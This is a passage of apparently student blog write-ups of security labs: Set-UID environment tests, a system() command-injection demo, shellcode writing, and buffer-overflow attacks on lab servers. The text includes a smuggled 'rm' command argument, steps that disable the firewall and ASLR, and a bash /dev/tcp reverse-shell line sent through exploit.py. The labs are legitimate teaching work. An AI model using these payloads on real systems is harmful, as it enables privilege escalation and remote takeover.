alt="image-20241125093943122"></p></li></ol><p><strong>说明：</strong>对比发现两个输出文件有差别，即子进程没有继承父进程的环境变量。</p><p>场景三中：</p><p>若在root用户下运行，子进程会继承父进程的环境变量；</p><p>而在seed用户下运行，子进程则不会继承父进程的环境变量。</p><hr><h6 id="场景四：将task7设置为Set-UID-user1程序，并在seed用户下设置环境变量"><a href="#场景四：将task7设置为Set-UID-user1程序，并在seed用户下设置环境变量" class="headerlink" title="场景四：将task7设置为Set-UID user1程序，并在seed用户下设置环境变量"></a>场景四：将task7设置为Set-UID user1程序，并在seed用户下设置环境变量</h6><ol><li><p>设置环境变量：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241125094634077.png" alt="image-20241125094634077"></p></li><li><p>输出子进程，并设置为user1的Set_UID程序，输出存为<code>child_user1.txt</code>文件：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241125094730052.png" alt="image-20241125094730052"></p></li><li><p>输出父进程，输出存为<code>parent_user1.txt</code>文件：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241125094816838.png" alt="image-20241125094816838"></p></li><li><p>对比两个输出文件，发现子进程未继承父进程的环境变量：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241125094906143.png" alt="image-20241125094906143"></p></li></ol><p><strong>说明：</strong>场景四中子进程未继承父进程的LD_PRELOAD环境变量。</p><hr><h5 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h5><p>场景一中，普通用户下执行myprog程序，此时普通用户为myprog程序的拥有者，而且在普通用户下设置了环境变量，所以真实用户ID与拥有者用户ID一致，子进程会继承seed用户下的环境变量，并加入共享库；</p><p>场景二中，myprog为Set-UID 程序，在普通用户下执行，ID不一致，所以动态链接器会忽略LD_PRELOAD环境变量，子进程不能继承seed用户下的LD*环境变量；</p><p>场景三中，myprog为Set-UID 根程序，并在Root用户下设置了环境变量，所以在root用户下运行myprog，ID一致，所以子进程会继承root用户下的LD_PRELOAD环境变量，并加入共享库；而在普通用户下运行，ID则会不匹配，环境变量被忽略；</p><p>场景四中，myprog为Set-UID user1程序，在seed用户下执行也会遇到ID不一致，所以忽略环境变量。</p><hr><h4 id="Task-8-Invoking-External-Programs-Using-system-versus-execve"><a href="#Task-8-Invoking-External-Programs-Using-system-versus-execve" class="headerlink" title="Task 8: Invoking External Programs Using system() versus execve()"></a>Task 8: Invoking External Programs Using system() versus execve()</h4><p>任务：将system()与execve()在Set-UID程序下执行，观察其对系统文件的危害行为</p><h6 id="Step1-使用system-调用外部程序，删除根用户拥有的文件"><a href="#Step1-使用system-调用外部程序，删除根用户拥有的文件" class="headerlink" title="Step1. 使用system()调用外部程序，删除根用户拥有的文件"></a>Step1. 使用system()调用外部程序，删除根用户拥有的文件</h6><ol><li><p>编辑<code>task8.c</code>文件：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241125095408128.png" alt="image-20241125095408128"></p></li><li><p>进入root，创建<code>home1</code>目录，创建<code>hello.c</code>文件：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241125100229815.png" alt="image-20241125100229815"></p></li><li><p>退出root，在普通用户下，删除<code>hello.c</code>文件，失败：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241125100317719.png" alt="image-20241125100317719"></p></li><li><p>返回原文件夹，执行下命令，成功删除：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./task8 <span class="hljs-string">&quot;home1/hello.c;rm home1/hello.c&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241125100426795.png" alt="image-20241125100426795"></p></li></ol><hr><h6 id="Step-2-使用execve-调用外部程序"><a href="#Step-2-使用execve-调用外部程序" class="headerlink" title="Step 2. 使用execve()调用外部程序"></a>Step 2. 使用execve()调用外部程序</h6><ol><li><p>修改<code>task8.c</code>文件：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241125100727862.png" alt="image-20241125100727862"></p></li><li><p>编译<code>task8.c</code>文件，并设置为Set_UID程序：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241125101048731.png" alt="image-20241125101048731"></p></li><li><p>在root下创建<code>/home/hello.c</code>：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241125101244986.png" alt="image-20241125101244986"></p></li><li><p>返回原文件夹，执行下命令，删除失败：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./task8 <span class="hljs-string">&quot;home1/hello.c;rm home1/hello.c&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241125101349357.png" alt="image-20241125101349357"></p></li></ol><p>使用system()可以成功删除不可写文件，是因为system会创建一个子进程，子进程调用一个新的shell程序，而且task8是一个Set-UID根程序，在执行时会以root权限执行删除文件的命令，可以成功删除。</p><p>使用execve()不可以成功删除不可写文件，因为execve会执行一个新程序，而不会调用新的shell程序，将输入的参数仅仅当成一个字符串，不会执行命令，所以不能删除不可写文件。</p><hr><h4 id="Task-9-Capability-Leaking"><a href="#Task-9-Capability-Leaking" class="headerlink" title="Task 9: Capability Leaking"></a>Task 9: Capability Leaking</h4><ol><li><p>root下，创建一个<code>etc</code>文件夹，文件夹内创建<code>test.txt</code>文件，并设置其权限为0644：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241125102426468.png" alt="image-20241125102426468"></p></li><li><p>返回普通用户，在原文件夹编辑<code>task8.c</code>文件：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241125101947586.png" alt="image-20241125101947586"></p></li><li><p>编译文件，设置<code>task8</code>为Set_UID程序：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241125102603957.png" alt="image-20241125102603957"></p></li><li><p>回到<code>/etc</code>文件夹，将恶意代码写入了<code>test.txt</code>文件：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241125102715694.png" alt="image-20241125102715694"></p></li></ol><hr><h3 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h3><p><del>删掉啦</del></p>]]></content>
    
    
    <categories>
      
      <category>study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>攻防实验</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Lab 5</title>
    <link href="/2024/12/25/lab5/"/>
    <url>/2024/12/25/lab5/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1 id="Lab-5-shellcode编写实验"><a href="#Lab-5-shellcode编写实验" class="headerlink" title="Lab 5-shellcode编写实验"></a>Lab 5-shellcode编写实验</h1><h3 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h3><p>shellcode广泛用于许多涉及代码注入的攻击中。编写shellcode是相当有挑战性的。虽然我们可以很容易地从互联网上找到现有的shellcode，但是能够从头开始编写我们自己的shellcode总是令人兴奋的。shellcode中涉及到几种有趣的技术。本实验室的目的是帮助学生理解这些技术，以便他们能够编写自己的shellcode。</p><p>编写shellcode有几个挑战，一个是确保二进制文件中没有0x00，另一个是找出命令中使用的数据的地址。第一个挑战不是很难解决，有几种方法可以解决它。第二个挑战的解决方案导致了编写外壳代码的两种典型方法。在一种方法中，数据在执行期间被推入堆栈，因此可以从堆栈指针获得它们的地址。在第二种方法中，数据存储在代码区域中，就在调用指令之后，因此在调用调用函数时，其地址被推入堆栈（作为返回地址）。两种解决方案都非常优雅，我们希望学生能够学习这两种技术。</p><hr><h3 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h3><h4 id="Task-1-Writing-Shellcode"><a href="#Task-1-Writing-Shellcode" class="headerlink" title="Task 1: Writing Shellcode"></a>Task 1: Writing Shellcode</h4><h5 id="Task-1-a-The-Entire-Process"><a href="#Task-1-a-The-Entire-Process" class="headerlink" title="Task 1.a: The Entire Process"></a>Task 1.a: <strong>The Entire Process</strong></h5><ol><li><p>首先，安装 nasm，用于对汇编语言文件进行反汇编：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241122225811935.png" alt="image-20241122225811935"></p></li><li><p>使用nasm反汇编<code>mysh.s</code>文件，得到<code>mysh.o</code>：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241122225944335.png" alt="image-20241122225944335"></p></li><li><p>使用<code>ld</code>命令编译，得到可执行代码<code>mysh</code>：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241122230134174.png" alt="image-20241122230134174"></p></li><li><p>运行<code>mysh</code>，可以得到一个shell：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241122230221156.png" alt="image-20241122230221156"></p></li><li><p>输出这个shell的进程ID为<code>11300</code>：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241122230313049.png" alt="image-20241122230313049"></p></li><li><p>若新开一个终端，可以发现进程ID是不同的，输出为<code>11303</code>：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241122230359971.png" alt="image-20241122230359971"></p></li><li><p>使用<code>objdump</code>命令以英特尔模式生成<code>mysh.o</code>的汇编代码：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241122230445430.png" alt="image-20241122230445430"></p></li><li><p>使用xxd命令打印出二进制文件，即可得到shellcode的机器码，以<code>31c0</code>开头，<code>cd80</code>结尾：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241122230652176.png" alt="image-20241122230652176"></p></li><li><p>修改<code>convert.py</code>文件，将<code>ori_sh</code>变量中的值替换为上图中的机器码：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241122225650876.png" alt="image-20241122225650876"></p></li><li><p>运行<code>convert.py</code>，得到shellcode中包含的16进制形式的机器码：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241122230954747.png" alt="image-20241122230954747"></p></li></ol><hr><h5 id="Task-1-b-Eliminating-Zeros-from-the-Code"><a href="#Task-1-b-Eliminating-Zeros-from-the-Code" class="headerlink" title="Task 1.b: Eliminating Zeros from the Code"></a>Task 1.b: <strong>Eliminating Zeros from the Code</strong></h5><p>要求运行：<code>/bin/bash</code></p><ol><li><p>修改<code>mysh.s</code>如下，按照倒序对<code>/bin/bash</code>和4 bytes对齐进行入栈，入栈顺序为<code>h</code>, <code>/bas</code>, <code>/bin</code>；</p><p>入栈为<code>h</code>时不够4 bytes，则对高位进行补0，但要求不能出现0，所以直接对<code>al</code>赋值：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241122231623941.png" alt="image-20241122231623941"></p></li><li><p>得到SHELL环境变量为<code>/bin/bash</code>：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241122231806071.png" alt="image-20241122231806071"></p></li></ol><hr><h5 id="Task-1-c-Providing-Arguments-for-System-Calls"><a href="#Task-1-c-Providing-Arguments-for-System-Calls" class="headerlink" title="Task 1.c: Providing Arguments for System Calls"></a>Task 1.c: <strong>Providing Arguments for System Calls</strong></h5><p>要求运行： <code>/bin/sh -c &quot;ls -la&quot;</code></p><ol><li><p>修改<code>mysh.s</code>：</p><p>在栈中压入<code>/bin//sh</code>后，将栈顶指针地址移动到ebx寄存器，即将该参数其地址存储在ebx；</p><p>在栈中压入<code>-c</code>后，将栈顶指针地址移动到edx寄存器，即将该参数其地址存储在edx；</p><p>在栈中压入<code>ls -la</code>后，将栈顶指针地址移动到ecx寄存器，即将该参数其地址存储在ecx；</p><p>然后，再将<code>args</code>列表压入栈中，将栈顶指针esp移动到ecx寄存器作为系统调用参数二，完成args的传递；同时args[0]，即path的地址已经在ebx寄存器中，也已放在了ebx寄存器中，因此path的传递也完成了。</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241122232941361.png" alt="image-20241122232941361"></p></li><li><p>编译<code>mysh.s</code>，得到<code>mysh.o</code> 和<code>mysh</code>：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241122233025501.png" alt="image-20241122233025501"></p></li><li><p>执行<code>./mysh</code>，得到溢出结果：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241122233054923.png" alt="image-20241122233054923"></p></li></ol><hr><h5 id="Task-1-d-Providing-Environment-Variables-for-execve"><a href="#Task-1-d-Providing-Environment-Variables-for-execve" class="headerlink" title="Task 1.d: Providing Environment Variables for execve()"></a>Task 1.d: <strong>Providing Environment Variables for</strong> <strong>execve()</strong></h5><ol><li><p>修改<code>mysh.s</code>：</p><p>将execve系统调用的path设置为<code>/usr/bin/env</code>；</p><p>args设置为<code>&#123; &quot;/usr/bin/env&quot;, NULL &#125;</code>；</p><p>envs设置为<code>&#123; &quot;aaa=1234&quot;, &quot;bbb=5678&quot;, &quot;cccc=1234&quot;, NULL &#125;</code>：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241122233245920.png" alt="image-20241122233245920"></p></li><li><p>编译<code>mysh.s</code>，得到<code>mysh.o</code> 和<code>mysh</code>：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241122233316162.png" alt="image-20241122233316162"></p></li><li><p>执行<code>./mysh</code>，得到执行结果：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241122233341699.png" alt="image-20241122233341699"></p></li></ol><hr><h4 id="Task-2-Using-Code-Segment"><a href="#Task-2-Using-Code-Segment" class="headerlink" title="Task 2: Using Code Segment"></a>Task 2: <strong>Using Code Segment</strong></h4><ol><li><p>修改<code>mysh2.s</code>，通过获取所有必要数据结构的地址来完成汇编语言的编程：</p><p>类似执行<code>/usr/bin/env*AAAABBBBa=11*b=22*CCCCDDDDEEEE</code></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241122233544177.png" alt="image-20241122233544177"></p></li><li><p>编译得到<code>mysh2.o</code>文件，并使用 –omagic 选项得到<code>mysh2</code>可执行文件，这样代码段才是可写的：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241122233913320.png" alt="image-20241122233913320"></p></li><li><p>执行<code>mysh2</code>文件：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241122234036714.png" alt="image-20241122234036714"></p></li></ol><hr><h4 id="Task-3-Writing-64-bit-Shellcode"><a href="#Task-3-Writing-64-bit-Shellcode" class="headerlink" title="Task 3: Writing 64-bit Shellcode"></a>Task 3: <strong>Writing 64-bit Shellcode</strong></h4><ol><li><p>查看<code>mysh_64.s</code>文件，与编写 32 位 shellcode 相似，但在64位架构中，调用系统调用通过<code>syscall</code>指令完成，系统调用的前三个参数分别存储在 rdx、rsi 和 rdi 寄存器中：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241122234156870.png" alt="image-20241122234156870"></p></li><li><p>修改编译命令，得到<code>mysh_64.o</code>文件，以及<code>mysh_64</code>可执行文件：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241122234431733.png" alt="image-20241122234431733"></p></li><li><p>运行<code>mysh_64</code>文件：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241122234612954.png" alt="image-20241122234612954"></p></li><li><p>查看SHELL环境变量：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241122234643708.png" alt="image-20241122234643708"></p></li></ol><hr><h3 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h3><p><del>删掉啦</del></p>]]></content>
    
    
    <categories>
      
      <category>study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>攻防实验</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Lab 4</title>
    <link href="/2024/12/25/lab4/"/>
    <url>/2024/12/25/lab4/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1 id="Lab-4-缓冲区溢出攻击实验"><a href="#Lab-4-缓冲区溢出攻击实验" class="headerlink" title="Lab 4-缓冲区溢出攻击实验"></a>Lab 4-缓冲区溢出攻击实验</h1><h3 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h3><p>本实验的学习目标是让学生将从课堂上学到的有关缓冲区溢出漏洞的知识进行实践，从而获得有关该漏洞的第一手经验。缓冲区溢出是指程序试图将数据写入预先分配的固定长度缓冲区边界之外的情况。恶意用户可利用此漏洞改变程序的流控制，甚至执行任意代码。此漏洞是由于数据存储（如缓冲区）和控件存储（如返回地址）的混合造成的：数据部分的溢出会影响程序的控制流，因为溢出会改变返回地址。</p><p>本实验将提供四台不同的服务器，每台服务器运行一个带有缓冲区溢出漏洞的程序。实验任务是开发一个利用漏洞的程序，并最终获得这些服务器上的root权限。除了进行这些攻击实验之外，还将试验几种针对缓冲区溢出攻击的对策。学生需要评估这些计划是否有效，并解释原因。</p><hr><h3 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h3><h4 id="准备docker"><a href="#准备docker" class="headerlink" title="准备docker"></a>准备docker</h4><p><font color='orange'>*这里因为我已经下好docker了，所以只是验证一下，没有配置docker请看<a href="#section1">第3步</a></font></p><ol><li><p>下载<code>handsonsecurity.tar</code>，使用离线方法，加载docker镜像；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker load -i handsonsecurity.tar<br>Loaded image: handsonsecurity/seed-ubuntu:small<br></code></pre></td></tr></table></figure><p>验证一下，发现已经加载成功了；</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028094757237.png" alt="image-20241028094757237"></p></li><li><p>返回<code>Labsetup</code>文件夹，使用命令开启docker；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd ..<br>docker-compose build<br>docker-compose up<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028094850533.png" alt="image-20241028094850533"></p><p>已经建立连接了；</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028094928269.png" alt="image-20241028094928269"></p></li><li><p><a id="section1"><font color='orange'>*注：查看一下docker是否成功挂载：</font></a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">systemctl status docker<br></code></pre></td></tr></table></figure><p><font color='orange'>如果没有反应的话下载docker.io（自行搜索一下）</font><font color='orange'>（记得换源之后下载）</font></p></li></ol><hr><h4 id="准备server"><a href="#准备server" class="headerlink" title="准备server"></a>准备server</h4><p><font color='orange'>*先尝试能不能直接<code>make</code>，如果可以就跳过第一步；因为我设置的默认gcc不是gcc-9，所以这里修改了一下<code>Makefile</code></font></p><ol><li><p>进入<code>server-code</code>文件夹，修改<code>Makefile</code>中指定的32位gcc版本；</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028092751621.png" alt="image-20241028092751621"></p></li><li><p><code>make</code>一下，成功了；</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028092839404.png" alt="image-20241028092839404"></p><p><code>ls</code>后，发现编译完成了；</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028093028502.png" alt="image-20241028093028502"></p></li><li><p><code>make install</code>安装一下；</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028092942365.png" alt="image-20241028092942365"></p></li></ol><hr><h4 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h4><ol><li><p>关闭防火墙：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo ufw disable<br></code></pre></td></tr></table></figure></li><li><p>关闭ALSR(地址空间随机化)：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo /sbin/sysctl -w kernel.randomize_va_space=0<br></code></pre></td></tr></table></figure></li></ol><p><strong>至此，准备工作完成了！</strong></p><hr><h4 id="Task1-熟悉shellcode"><a href="#Task1-熟悉shellcode" class="headerlink" title="Task1: 熟悉shellcode"></a>Task1: 熟悉shellcode</h4><ol><li><p>进入<code>shellcode</code>文件夹，运行<code>shellcode_32.py</code>和<code>shellcode_64.py</code>两个文件，得到<code>codefile_32</code>和<code>codefile_64</code>两个输出文件；</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028101608936.png" alt="image-20241028101608936"></p></li><li><p>修改一下<code>Makefile</code>文件中的gcc版本；</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028101817714.png" alt="image-20241028101817714"></p></li><li><p>使用<code>make</code>编译<code>call_shellcode.c</code>文件成功；</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028101923757.png" alt="image-20241028101923757"></p></li><li><p>测试一下两个输出文件；</p><p><code>a32.out</code>：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028102055064.png" alt="image-20241028102055064"></p><p><code>a64.out</code>：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028102127330.png" alt="image-20241028102127330"></p></li><li><p>根据task的要求，要求修改文件中的shellcode变量，执行删除文件的操作；</p><p>先创建一个要被删除的文件<code>target_file.txt</code>（内容随意）；</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241030135837904.png" alt="image-20241030135837904"></p><p>以此修改<code>shellcode_32.py</code>中的shellcode变量，因为要保证shellcode的字符数量相同，所以要用空格填充对齐；</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241030140728231.png" alt="image-20241030140728231"></p></li><li><p>先<code>make clean</code>清除一下，然后重新执行<code>shellcode_32.py</code>，<code>make</code>之后，重新执行<code>a32.out</code>输出文件，发现<code>target_file.txt</code>文件被删除；</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241030142250670.png" alt="image-20241030142250670"></p></li></ol><p><strong>至此，task1完成了！</strong></p><hr><h4 id="Task2-Level-1-Attack"><a href="#Task2-Level-1-Attack" class="headerlink" title="Task2: Level-1 Attack"></a>Task2: Level-1 Attack</h4><p><strong>目标服务器及端口：10.9.0.5 9090</strong></p><ol><li><p>先测试一下目标服务器及端口能否连通；</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028102506947.png" alt="image-20241028102506947"></p></li><li><p>输入<code>^C</code>后，返回输入的字符长度为6；</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028102902239.png" alt="image-20241028102902239"></p><p>得到<code>ebp=0xffffd4b8</code> 以及<code>buffer address=0xffffd448</code></p></li><li><p>进入<code>attack-code</code>文件夹，修改<code>exploit.py</code>文件；</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028105514401.png" alt="image-20241028105514401"></p><p>修改shellcode变量为<code>shellcode</code>文件夹中的<code>shellcode_32.py</code>文件；</p><p>修改start变量为<code>517-len(shellcode)</code>；</p><p>修改ret变量为<code>ebp+n</code>，n为任意大于8的整型，即<code>0xffffd4b8+8</code>；</p><p>修改offset变量为<code>0xffffd4b8-0xffffd448+4</code>，即为<code>116</code>；</p></li><li><p>执行<code>exploit.py</code>文件，并执行<code>cat badfile | nc 10.9.0.5 9090</code>语句，server中可以得到返回；</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028110518599.png" alt="image-20241028110518599"></p></li><li><p>根据task中的要求，为了获得权限，将<code>exploit.py</code>文件中的shellcode变量中：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;/bin/ls -l; echo Hello 32; /bin/tail -n 2 /etc/passwd     *&quot;</span><br></code></pre></td></tr></table></figure><p>改为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span><br></code></pre></td></tr></table></figure><p>将发送给10.9.0.5的内容，返回给10.9.0.1，实现反弹shell；</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028111210764.png" alt="image-20241028111210764"></p><p><font color='red'>*如何确定反弹shell的ip是否为10.9.0.1？</font></p><p>在终端输入<code>ifconfig</code>后，可以看到的ip：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241029003549026.png" alt="image-20241029003549026"></p></li></ol><hr><ul><li><p><font color='orange'>*如何确定反弹shell的ip是否为10.9.0.1？</font></p><p><font color='orange'>在终端输入<code>ifconfig</code>后，可以看到的ip：</font><img src="https://gitee.com/r0otsu/images/raw/master/image-20241029003549026.png" alt="image-20241029003549026"></p></li></ul><hr><ol start="6"><li><p>在另一个终端运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc -lnv 9090<br></code></pre></td></tr></table></figure><p>监听9090端口；<img src="https://gitee.com/r0otsu/images/raw/master/image-20241028121708338.png" alt="image-20241028121708338"></p></li><li><p>运行<code>exploit.py</code>文件，将<code>badfile</code>发送给服务器；<img src="https://gitee.com/r0otsu/images/raw/master/image-20241028121651830.png" alt="image-20241028121651830"></p></li><li><p>服务器中显示连接成功；<img src="https://gitee.com/r0otsu/images/raw/master/image-20241028121748465.png" alt="image-20241028121748465"></p></li><li><p>另一个终端中监听的9090端口，也反弹shell成功！<img src="https://gitee.com/r0otsu/images/raw/master/image-20241028174600553.png" alt="image-20241028174600553"></p></li></ol><p><strong>至此task2完成！</strong></p><hr><h4 id="Task3-Level-2-Attack"><a href="#Task3-Level-2-Attack" class="headerlink" title="Task3: Level-2 Attack"></a>Task3: Level-2 Attack</h4><p><strong>目标服务器及端口：10.9.0.6 9090</strong></p><ol><li><p>先测试一下目标服务器及端口能否连通；</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028174903178.png" alt="image-20241028174903178"></p><p>server端成功返回，测试成功：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028174952491.png" alt="image-20241028174952491"></p><p>但是，level-2的docker终端并未返回ebp，只返回了<code>buffer address=0xffffd3f8</code>，但是buffer的大小必然在[100, 300]之间，所以可以用循环，每4字节替换为ret进行测试，则必然可以执行缓冲区溢出攻击成功。</p></li><li><p>修改<code>exploit.py</code>文件，添加循环；</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028180458922.png" alt="image-20241028180458922"></p><p>修改ret变量为<code>buffer address +308</code>，即<code>0xffffd3f8+308</code>；</p><p>添加有关offset的循环；</p><p>注：由于先尝试让服务器简单溢出，所以选择了之前echo 32的代码；</p></li><li><p>执行<code>exploit.py</code>文件，并执行<code>cat badfile | nc 10.9.0.6 9090</code>语句；</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028180754152.png" alt="image-20241028180754152"></p><p>server中可以得到返回，溢出攻击成功！</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028180845540.png" alt="image-20241028180845540"></p></li><li><p>和task2一样，为了获得权限，修改<code>exploit.py</code>文件中的shellcode变量为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span><br></code></pre></td></tr></table></figure><p>将发送给10.9.0.6的内容，返回给10.9.0.1，实现反弹shell；</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028181046545.png" alt="image-20241028181046545"></p></li><li><p>在另一个终端监听9090端口；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc -lnv 9090<br></code></pre></td></tr></table></figure></li><li><p>运行<code>exploit.py</code>文件，将<code>badfile</code>发送给服务器；</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028181159693.png" alt="image-20241028181159693"></p></li><li><p>服务器中显示连接成功；</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028181224926.png" alt="image-20241028181224926"></p></li><li><p>另一个终端中监听的9090端口，也反弹shell成功了！</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028181249641.png" alt="image-20241028181249641"></p></li></ol><p><strong>至此task3完成！</strong></p><hr><h4 id="Task4-Level-3-Attack"><a href="#Task4-Level-3-Attack" class="headerlink" title="Task4: Level-3 Attack"></a>Task4: Level-3 Attack</h4><p><strong>目标服务器及端口：10.9.0.7 9090</strong></p><ol><li><p>先测试一下目标服务器及端口能否连通；</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028181417879.png" alt="image-20241028181417879"></p><p>server端成功返回，测试成功：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028181444541.png" alt="image-20241028181444541"></p><p>由此可见，10.9.0.7服务器上运行的是64位的程序，只要能够覆盖64位返回地址，就能实现64位程序的缓冲区溢出攻击。</p><p>得到了<code>rbp=0x00007fffffffe3e0</code>和<code>buffer address=0x00007fffffffe310</code></p></li><li><p>复制<code>shellcode</code>文件夹中的<code>shellcode_64.py</code>文件作为<code>attack-code</code>文件夹中<code>exploit.py</code>文件的shellcode变量；</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028181908364.png" alt="image-20241028181908364"></p><p>修改<code>exploit.py</code>文件的shellcode变量：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028202750544.png" alt="image-20241028202750544"></p><p>修改shellcode变量为<code>shellcode</code>文件夹中<code>shellcode_64.py</code>文件的shellcode变量；</p><p>修改start变量为0；</p><p>修改ret变量为<code>buffer address</code>，即<code>0x00007fffffffe310</code>；</p><p>修改offset变量为<code>rbp-buffer 